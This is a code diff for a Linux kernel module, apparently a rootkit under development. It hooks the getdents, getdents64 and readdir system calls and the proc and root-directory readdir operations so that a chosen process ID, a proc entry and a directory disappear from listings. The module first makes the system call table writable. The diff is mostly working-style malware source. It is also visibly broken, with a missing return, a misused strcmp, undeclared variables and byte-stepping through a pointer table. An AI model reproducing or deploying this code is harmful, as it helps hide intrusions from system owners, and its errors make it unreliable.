@@ -8,6 +8,7 @@
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
 #include <asm/uaccess.h>
+#include <linux/fs.h>
 
 #include "sysmap.h"          /* Pointers to system functions */
 
@@ -29,10 +30,13 @@ typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __
 // for hooking getdents (32 and 64 bit)
 typedef asmlinkage ssize_t (*fun_long_int_linux_dirent_int)(unsigned int, struct linux_dirent __user *, unsigned int);
 typedef asmlinkage ssize_t (*fun_long_int_linux_dirent64_int)(unsigned int, struct linux_dirent64 __user *, unsigned int);
+// for hooking the virtual file system call
+typedef int (*fun_int_struct_file_void_filldir_t)(struct file *, void*, filldir_t);
 
-fun_ssize_t_int_pvoid_size_t     original_read;
-fun_long_int_linux_dirent_int    original_getdents;
-fun_long_int_linux_dirent64_int  original_getdents64;
+fun_ssize_t_int_pvoid_size_t       original_read;
+fun_long_int_linux_dirent_int      original_getdents;
+fun_long_int_linux_dirent64_int    original_getdents64;
+fun_int_struct_file_void_filldir_t original_vfs_readdir;
 
 /* Make a certain address writeable */
 void make_page_writable(long unsigned int _addr){
@@ -112,8 +116,8 @@ asmlinkage ssize_t hooked_getdents64 (unsigned int fd, struct linux_dirent64 __u
 
     // copy data back and return result
     if(copy_to_user (dirent,head,result)){
-printk (KERN_INFO "error copying data back\n");
-return result;
+        printk (KERN_INFO "error copying data back\n");
+        return result;
     }
     kfree(p);
     return result;
@@ -122,30 +126,117 @@ return result;
 
 }
 
+//int hooked_vfs_readdir(struct file* file, filldir_t filler, void* buf){
+int hooked_vfs_readdir(struct file* file, void* buf, filldir_t filler){
+    printk(KERN_INFO "hooked_vfs_readdir\n");
+    return original_vfs_readdir(file, buf, filler);
+}
+
+void** find_original_vfs_readdir(void){
+    void* sys_call_table = (void*)ptr_sys_call_table;
+    void** cur_func = (void*)sys_call_table; 
+    void* location_of_vfs_read_dir = ptr_vfs_readdir;
+    unsigned int result=0;
+    printk(KERN_INFO "*ptr_vfs_readdir = %p\n", ptr_vfs_readdir);
+    // loop through system call table to find the index
+    // where the function pointer to vfs_readdir is stored.
+    while ((unsigned long)ptr_vfs_readdir != (unsigned long)*cur_func){
+        cur_func = (char*)cur_func + 1;
+    }
+    printk (KERN_INFO "I found it: %p == %p\n", *cur_func, ptr_vfs_readdir);
+    return cur_func;
+}
+
+void hook_proc(void){
+    key = create_proc_entry(KEY, 0666, NULL);
+    proc = key->parent;
+    proc_fops = (struct file_operations*)proc->proc_fops;
+    original_proc_readdir = proc_fops->readdir;
+    proc_fops->readdir = hooked_proc_readdir;
+}
+
+int hook_root(void){
+    f = filp_open("/", O_RDONLY, 0600);
+    if (IS_ERR(f)){
+        return -1;
+    }
+    original_root_readdir = f->f_op->readdir;
+    f->f_op->readdir = hooked_root_readdir;
+    filp_close(f, NULL);
+    return 0;
+}
+
+static inline int hooked_proc_filldir(void* __buf, const char* name, int namelen, loff_t offset, u64 ino, unsigned d_type){
+    if (!strcmp(name, HIDDEN_PID) || !strcmp (name, KEY)){
+        return 0;
+    }
+}
+
+static int hooked_root_filldir(void* __buf, const char* name, int namelen, loff_t offset, u64 ino, unsigned d_type){
+    if (strcmp(name, HIDDEN_DIR, namelen)==0){
+        return 0;
+    }
+    return original_root_filldir(__buf, name, namelen, offset, ino, d_type);
+}
+
+static int hooked_root_readdir(struct file* filp, void* dirent, filldir_t filldir){
+    original_root_filldir = filldir;
+    return original_root_readdir(filp, dirent, hooked_root_filldir);
+}
+
+static inline int hooked_proc_readdir(struct file* filp, void* dirent, filldir_t filldir){
+    original_filldir = filldir;
+    return original_proc_readdir(filp, dirent, hooked_proc_filldir);
+}
+
 /* Hooks the read system call. */
 void hook_functions(void){
-  void** sys_call_table = (void *) ptr_sys_call_table;
-  // retrieve original functions
-  original_read = sys_call_table[__NR_read];
-  original_getdents = sys_call_table[__NR_getdents];
-  original_getdents64 = sys_call_table[__NR_getdents64];
-  // remove write protection
-  make_page_writable((long unsigned int) ptr_sys_call_table);
-  // replace function pointers! YEEEHOW!!
-  // sys_call_table[__NR_read] = (void*) hooked_read;
-  sys_call_table[__NR_getdents] = (void*) hooked_getdents;
-  sys_call_table[__NR_getdents64] = (void*) hooked_getdents64;
+    void** sys_call_table = (void *) ptr_sys_call_table;
+    // retrieve original functions
+    void** my_NR_vfsreaddir;
+    struct file* root_file;
+    struct file_operations orig_f_op;
+    original_read = sys_call_table[__NR_read];
+    original_getdents = sys_call_table[__NR_getdents];
+    original_getdents64 = sys_call_table[__NR_getdents64];
+    // remove write protection
+    make_page_writable((long unsigned int) ptr_sys_call_table);
+    // replace function pointers! YEEEHOW!!
+    // sys_call_table[__NR_read] = (void*) hooked_read;
+    sys_call_table[__NR_getdents] = (void*) hooked_getdents;
+    sys_call_table[__NR_getdents64] = (void*) hooked_getdents64;
+    sys_call_table[__NR_readdir] = (void*) hooked_vfs_readdir;
+    // hook vfs_readdir
+    /*
+    my_NR_vfsreaddir = find_original_vfs_readdir();
+    original_vfs_readdir = *my_NR_vfsreaddir;
+    printk(KERN_INFO "my_NR_vfsreaddir = %p\n", my_NR_vfsreaddir);
+    printk(KERN_INFO "*my_NR_vfsreaddir = %p\n", *my_NR_vfsreaddir);
+    // make_page_writable((long unsigned int)my_NR_vfsreaddir);
+    // *my_NR_vfsreaddir = (void*)hooked_vfs_readdir;
+    // printk(KERN_INFO "new *my_NR_vfsreaddir = %p\n", *my_NR_vfsreaddir);
+    root_file = filp_open("/", O_RDONLY, 0600);
+    // for now, we just assume opening works, 
+    // so we omit successfulness checks et. al.
+    original_vfs_readdir = (void*)root_file->f_op->readdir;
+    *my_NR_vfsreaddir = root_file->f_op->readdir;
+    printk(KERN_INFO "root_file->f_op->readdir = %p\n", root_file->f_op->readdir);
+    //make_page_writable((long unsigned int)root_file->f_op->readdir);
+    //root_file->f_op->readdir = hooked_vfs_readdir;
+    orig_f_op = *root_file->f_op;
+    filp_close(root_file, NULL);
+    */
 }
 
 /* Hooks the read system call. */
 void unhook_functions(void){
-  void** sys_call_table = (void *) ptr_sys_call_table;
-  make_page_writable((long unsigned int) ptr_sys_call_table);
-  // here, we restore the original functions
-  sys_call_table[__NR_read] = (void*) original_read;
-  sys_call_table[__NR_getdents] = (void*) original_getdents;
-  sys_call_table[__NR_getdents64] = (void*) original_getdents64;
-  make_page_readonly((long unsigned int) ptr_sys_call_table);
+    void** sys_call_table = (void *) ptr_sys_call_table;
+    make_page_writable((long unsigned int) ptr_sys_call_table);
+    // here, we restore the original functions
+    sys_call_table[__NR_read] = (void*) original_read;
+    sys_call_table[__NR_getdents] = (void*) original_getdents;
+    sys_call_table[__NR_getdents64] = (void*) original_getdents64;
+    make_page_readonly((long unsigned int) ptr_sys_call_table);
 }
 /* Print the number of running processes */
 int print_nr_procs(void){
